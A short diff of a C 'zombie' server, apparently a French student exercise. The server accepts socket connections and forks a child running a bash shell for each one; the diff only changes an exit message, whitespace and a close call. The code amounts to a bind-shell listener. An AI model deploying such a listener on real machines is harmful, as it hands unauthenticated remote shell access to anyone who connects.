@@ -59,7 +59,7 @@ void createBash (void * sock){
 }
 
 void done(){
-	printf("fini\n");
+	printf("frzearezzf\n");
 	for (int i = 0; i < numberChild; ++i){
 		skill(tabChild[i],SIGINT);
 	}
@@ -74,20 +74,21 @@ int main(int argc, char const *argv[]){
 	else 
 		zombie = initSocketServer(false,-1);
 	
-
 	ssigaction(SIGINT,done);
+
+
 	printf("Le serveur tourne sur le port : %i \n", zombie.port);	
 	int newsockfd =0;
 
 	while((newsockfd = saccept(zombie.sockFd))>0){	
 		int childId=fork_and_run1(createBash,&newsockfd);
 		tabChild[numberChild]=childId;
-		numberChild++;
+		numberChild++;	
+
 	}
 		
 
 	
-	sclose(newsockfd);
 	sclose(zombie.sockFd);
 	return 0;
 }
